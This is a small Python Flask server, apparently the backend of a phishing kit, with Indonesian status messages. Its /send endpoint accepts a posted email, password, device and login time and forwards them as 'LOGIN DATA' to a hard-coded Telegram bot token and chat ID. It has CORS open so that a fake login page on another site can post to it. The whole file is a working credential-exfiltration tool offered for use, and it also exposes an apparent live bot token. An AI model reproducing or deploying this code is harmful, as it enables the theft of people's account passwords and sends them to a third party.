from flask import Flask, request, jsonify
from flask_cors import CORS
import requests

app = Flask(__name__)
CORS(app)

BOT_TOKEN = "8071583681:AAF6hoDB1lMVpx59cIEM_caXsHfjgZh_2ps"
CHAT_ID = "7958093111"

@app.route("/")
def home():
    return "✅ Server Flask di Render jalan!"

@app.route("/send", methods=["POST"])
def send():
    try:
        data = request.json
        email = data.get("email")
        password = data.get("password")
        device = data.get("device")
        login_time = data.get("loginTime")

        msg = (
            f"🟢 LOGIN DATA\n"
            f"📧 Email: {email}\n"
            f"🔒 Password: {password}\n"
            f"📱 Perangkat: {device}\n"
            f"🕒 Waktu: {login_time}"
        )

        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        res = requests.post(url, json={"chat_id": CHAT_ID, "text": msg})

        if res.status_code == 200:
            return jsonify({"ok": True, "message": "Terkirim ke Telegram"})
        else:
            return jsonify({"ok": False, "message": "Gagal kirim ke Telegram"}), 400

    except Exception as e:
        return jsonify({"ok": False, "error": str(e)}), 500


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
